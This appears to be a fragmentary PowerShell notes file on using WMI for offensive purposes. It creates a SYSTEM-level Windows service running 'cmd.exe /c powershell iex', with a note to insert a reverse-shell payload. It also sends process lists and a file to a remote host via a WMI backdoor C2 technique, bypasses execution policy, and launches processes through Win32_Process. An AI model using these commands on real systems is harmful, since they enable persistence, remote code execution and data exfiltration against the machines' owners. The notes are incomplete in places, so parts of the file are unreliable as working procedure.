#Starting a service using WMI
#For some reason the service does not return response timely and nothing happens
# PSexec has been using similar attack vectors for years
# A service contacting a remote box raises more suspicion than a local service being started.
#Can we get a reverse shell on a wmi server usign
$ServiceType = [byte]16
$ErrorControl = [byte]1
Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,"Windows Performance",$ErrorControl,$null,$null,"WinPerf","C:\Windows\system32\calc.exe",$null,$ServiceType,"Manual","NT AUTHORITY\SYSTEM",""


Invoke-WmiMethod -Class Win32_Service -Name Create -ArgumentList $false,"Windows Performance",$ErrorControl,$null,$null,"WinPerf","C:\Windows\system32\cmd.exe /c powershell iex",$null,$ServiceType,"Manual","NT AUTHORITY\SYSTEM",""
#Insert here powershell payload to spawn a reverse shell of the same.


#Use Mattifestation WMI Backdoor which he used in  blackhat in 2015
#Mattifestation demonstrates WMI as a storage and a c2c channel back to the attacker
#Clone Send-Info WMI
Send-InfoWMI -DatatoSend (Get-Process) -ComputerName 10.10.0.3 -Username Administrator
Send-InfoWMI -DatatoSend (Get-Process) -ComputerName <IP> -Username Administrator

Send-InfoWMI -FiletoSend C:\test\evilstuff.txt -ComputerName <IPDEST> -Username Administrator

Send-InfoWMI -FiletoSend 
#Remember to do this before running any scripts (To allow scripts to rn)
powershell -ep bypass


#More backdoor stuff with WMI
#List all LocalAdmins on the box https://github.com/rzander/LocalAdmins/blob/master/WMIProvider.cs
#Poc evil WMi provider 
#Modify jaredcatkinson C# code to Allow

Get-WmiObject -Class Win32_Process -List | Select -ExpandProperty Methods | where name -eq "Create"

Get-WmiObject -Class Win32_Process -List | Select -ExpandProperty Methods | where name -eq "Create" | Select -ExpandProperty Qualifiers

Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList "cmd.exe",$null,$null